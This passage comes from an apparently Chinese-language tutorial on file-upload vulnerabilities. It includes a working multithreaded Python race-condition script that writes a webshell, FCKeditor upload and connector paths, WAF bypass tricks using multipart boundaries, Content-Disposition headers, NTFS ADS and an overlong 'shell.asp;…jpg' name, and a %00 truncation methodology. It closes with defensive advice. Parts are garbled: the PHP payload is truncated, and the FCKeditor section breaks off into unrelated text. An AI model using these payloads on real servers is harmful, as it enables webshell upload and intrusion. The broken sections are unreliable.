    }
    $ext = array_pop(explode(".",$_FILES['file']['name']));
    if(!in_array($ext,$allowtype)){
        unlink($newfile);
        die("error:upload the file type is not allowed，delete the file！");
    }
    ?>
首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：
    '); ?>
当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：
    import os
    import requests
    import threading
    class RaceCondition(threading.Thread):
        def __init__(self):
            threading.Thread.__init__(self)
            self.url = "http://127.0.0.1:8080/upload/shell0.php"
            self.uploadUrl = "http://127.0.0.1:8080/upload/copy.php"
        def _get(self):
            print('try to call uploaded file...')
            r = requests.get(self.url)
            if r.status_code == 200:
                print("[*]create file info.php success")
                os._exit(0)
        def _upload(self):
            print("upload file.....")
            file = {"file":open("shell0.php","r")}
            requests.post(self.uploadUrl, files=file)
        def run(self):
            while True:
                for i in range(5):
                    self._get()
                for i in range(10):
                    self._upload()
                    self._get()
    if __name__ == "__main__":
        threads = 20
        for i in range(threads):
            t = RaceCondition()
            t.start()
        for i in range(threads):
            t.join()
经过几次尝试后成功成功写入shell
## 针对各种CMS
比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。
  * PHPCMSv9.6.0任意文件上传
## 针对各种编辑器漏洞
比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。
### 文本编辑器
常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。
### 1 FCKeditor
下面以FCKeditor(现名为CKEditor)为例：
    1、敏感信息暴漏
        * 查看版本信息
            /FCKeditor/editor/dialog/fck_about.html
        * 默认上传页面
            /FCKeditor/editor/filemanager/browser/default/browser.html
            /FCKeditor/editor/filemanager/browser/default/connectors/test.html
            /FCKeditor/editor/filemanager/upload/test.html
            /FCKeditor/editor/filemanager/connectors/test.html
            /FCKeditor/editor/filemanager/connectors/uploadtest.html
        * 其他敏感文件
            /FCKeditor/editor/filemanager/connectors/aspx/connector.html
            /FCKeditor/editor/filemanager/connectors/asp/connector.html
            /FCKeditor/editor/filemanager/connectors/php/connector.php
    2、黑名单策略错误
        FCKeditor
    -----------------------------4714631421141173021852555099--
但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：
Win2k3 + IIS6.0 + ASP
###### 文件名处回车
###### 多个Content-Disposition
在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP
##### 利用NTFS ADS特性
ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。
##### 文件重命名绕过
如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。
##### 特殊的长文件名绕过
文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：
shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg
##### 反删除
将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）
## 总结
    条件： 寻找一个上传点，查看上传点是否可用。
    利用：
    首先判断是程序员自己写的上传点，还是编辑器的上传功能
    如果是编辑器上传功能，goolge当前编辑器的漏洞
    如果是程序员写的上传点
    上传一个正常的jpg图片 查看上传点是否可用
    上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）
    上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg
    判断服务器是什么类型，web服务器程序，是什么类型，版本号多少
    利用解析漏洞
## 防护建议
  1. 使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）
  2. 验证文件内容，使用正则匹配恶意代码限制上传
  3. 对上传后的文件统一随机命名，不允许用户控制扩展名
  4. 修复服务器可能存在的解析漏洞
  5. 严格限制可以修改服务器配置的文件上传如：.htaccess
  6. 隐藏上传文件路径。
  7. 升级Web Server
  8. 及时修复Web上传代码（重要）
  9. 不能有本地文件包含漏洞
  10. 注意0x00截断攻击（PHP更新到最新版本）
  11. 上传文件的存储目录禁用执行权限
## 拓展资料
  * [http://thief.one/2016/09/21/服务器解析漏洞/](http://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/)
## 参考资料
  * [文件上传漏洞解析及绕过姿势](http://www.y-hkl.top/2017/09/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/ "文件上传漏洞解析及绕过姿势")
  * 
  * 
  * 
  * 
  * [文件上传漏洞总结](http://jdrops.dropsec.xyz/2017/07/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/ "文件上传漏洞总结")
  * [文件上传漏洞（绕过姿势）](https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/ "文件上传漏洞（绕过姿势）")
  * 
* * *